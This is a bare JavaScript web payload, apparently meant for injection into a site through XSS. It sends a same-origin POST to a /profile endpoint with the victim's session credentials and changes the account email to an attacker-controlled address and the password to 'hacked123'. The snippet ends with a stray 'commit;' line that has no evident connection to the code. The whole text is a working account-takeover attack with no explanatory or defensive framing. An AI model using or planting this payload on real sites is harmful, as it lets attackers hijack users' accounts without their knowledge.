fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=pwned@attacker.com&password=hacked123',
  credentials: 'same-origin'
});

commit;
